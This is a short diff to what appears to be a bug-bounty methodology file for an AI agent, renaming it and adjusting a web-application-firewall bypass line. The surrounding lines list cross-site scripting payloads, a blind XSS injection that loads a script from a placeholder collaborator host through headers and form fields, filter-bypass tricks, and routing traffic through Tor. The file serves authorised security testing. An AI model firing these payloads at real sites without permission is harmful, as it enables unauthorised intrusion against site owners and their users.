@@ -1,4 +1,4 @@
-# Bug Bounty Hunting Skill (LostSec Methodology)
+# Bug Bounty Hunting Skill (Community Methodology)
 
 ## Phase 0: Session Setup
 - Source ~/.proxyenv for Tor proxy
@@ -81,7 +81,7 @@
 ### 5d: XSS Detection
 - Vectors: `<script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `<input autofocus onfocus=alert(1)>`
 - Blind XSS: Inject `<script src=https://collaborator/hook.js>` in User-Agent, headers, form fields
-- WAF Bypass: HTML entities, Unicode normalization, `eval(atob())`, `String.fromCharCode`, template literals
+- WAF Bypass: HTML entities, Unicode normalization, `eval(atob)`, `String.fromCharCode`, template literals
 - Browser validate: Use Playwright to confirm JS execution
 
 ### 5e: SSRF Detection
